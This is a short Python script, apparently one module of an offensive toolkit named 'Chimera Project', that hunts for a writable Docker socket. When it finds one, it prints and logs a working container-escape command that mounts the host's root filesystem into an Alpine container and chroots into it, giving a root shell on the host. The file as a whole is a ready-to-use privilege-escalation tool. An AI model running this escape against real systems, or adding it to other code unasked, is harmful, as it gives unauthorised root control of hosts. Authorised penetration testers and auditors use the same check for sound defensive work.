import os
import sys
import subprocess

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[34m" + "="*60)
    print("   CHIMERA AGENT 57 :: DOCKER DAEMON HUNTER")
    print("="*60 + "\033[0m")

    socket_path = "/var/run/docker.sock"
    
    print(f"[*] Checking permissions for {socket_path}...")

    if os.path.exists(socket_path):
        # Check if current user can write to the socket
        if os.access(socket_path, os.W_OK):
            print("\033[91m[!!!] CRITICAL: Docker socket is WRITABLE!\033[0m")
            
            # The "Standard" Escape: 
            # Run a container, mount the host's root (/) to /mnt/host, and chroot in.
            escape_cmd = "docker run -v /:/mnt/host -it alpine chroot /mnt/host /bin/sh"
            
            print(f"[*] Deployment logic ready. Manual Escape Command:\n\033[93m{escape_cmd}\033[0m")
            
            db.report_finding("57_Docker_Daemon_Hunter", "Docker_Socket_Writable", {
                "socket": socket_path,
                "payload": escape_cmd,
                "severity": "CRITICAL"
            })
        else:
            print("[-] Socket exists but current user has no write access.")
    else:
        print("[-] Docker socket not found in standard location.")

    db.close()

if __name__ == "__main__":
    run()
